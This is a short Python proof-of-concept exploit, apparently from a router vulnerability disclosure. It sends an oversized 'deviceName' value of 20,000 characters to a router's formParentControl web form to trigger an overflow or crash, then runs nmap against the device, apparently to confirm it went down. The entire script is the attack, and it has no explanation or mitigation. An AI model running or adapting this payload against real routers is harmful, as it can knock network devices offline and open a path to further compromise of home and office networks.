```
url = "http://192.168.0.1/boafrm/formParentControl"
headers = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "application/x-www-form-urlencoded",
	"Content-Length": "1981",
	"Origin": "http://192.168.0.1",
	"Connection": "close",
	"Referer": "http://192.168.0.1/parent_control.htm",
	"Upgrade-Insecure-Requests": "1",
	"Priority": "u=4",
}

repeated = "Abbb"*5000
data = "submit-url=%2Fparent_control.htm&delPCRule=&modPCRule=&modSelect=&status=1&urlNum=&modRuleStatus=&enabled=1&restrictType=0&macAddr=11-11-11-11-11-11&mac=111111111111&sunday=0&monday=0&tuesday=0&wednesday=0&thrusday=0&friday=0&saturday=0&comment=&addPCRule=%E5%BA%94%E7%94%A8&deviceName=1234={}".format (repeated)

response = requests.post (url, data=data, headers=headers, proxies=proxies,verify=False)
print ("执行nmap扫描... ...")
os.system ("nmap 192.168.0.1")
```

